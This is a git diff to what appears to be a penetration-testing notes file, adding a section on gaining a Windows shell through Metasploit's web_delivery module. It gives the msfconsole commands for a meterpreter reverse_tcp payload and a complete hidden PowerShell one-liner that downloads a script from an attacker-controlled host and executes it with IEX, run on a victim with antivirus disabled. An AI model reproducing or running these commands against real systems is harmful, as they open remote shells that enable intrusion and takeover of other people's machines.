@@ -23,3 +23,20 @@ Set up a reverse shell handler in kali.
 ```
 
 Run the exe in victim machine and wait for connection.
+
+
+# Exploiting via web delivery
+
+In msfconsole,
+```
+use exploit/multiscript/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+set lhost and lport
+
+in windows cmd with antivirus disabled,
+```
+powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://<ip>:<port>/<uri>');
+```
